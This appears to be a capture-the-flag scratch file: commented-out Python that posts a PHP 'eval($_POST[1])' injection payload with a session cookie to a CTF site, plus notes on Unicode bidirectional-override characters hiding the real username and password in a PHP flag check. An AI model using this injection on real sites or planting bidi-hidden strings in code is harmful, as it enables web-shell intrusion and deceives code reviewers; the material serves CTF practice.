# -*- coding: utf-8 -*-
# import requests
# url="https://blog.ctfer.com/c/t.php"

# cookie={
#     "PHPSESSID":"8b7b1d153e3c6916c68f62a8f44e1d2b"
# }

# data={
#     "dat":'";eval($_POST[1]);?>',
#     "title":"1",
#     "content":"%20",
# }
# response=requests.post(url=url+"?type=sumbit",data=data,cookies=cookie)
# print(response.text)
# a="admin‮⁦admin⁩⁦"
# a="username%253Dadmin%25E2%2580%25AE%25E2%2581%25A6admin%25E2%2581%25A9%25E2%2581%25A"
# print(a.count("%"))
if($_SERVER["REMOTE_ADDR"] == "127.0.0.1"){
    $usr = $_POST['username'];
    $passwd = $_GET['passwd'];
    if(is_numeric($passwd) && '12345‮⁦/123456⁩⁦6'==intval($passwd) && 'admin‮⁦admin⁩⁦'===$usr)echo $flag; //default:
}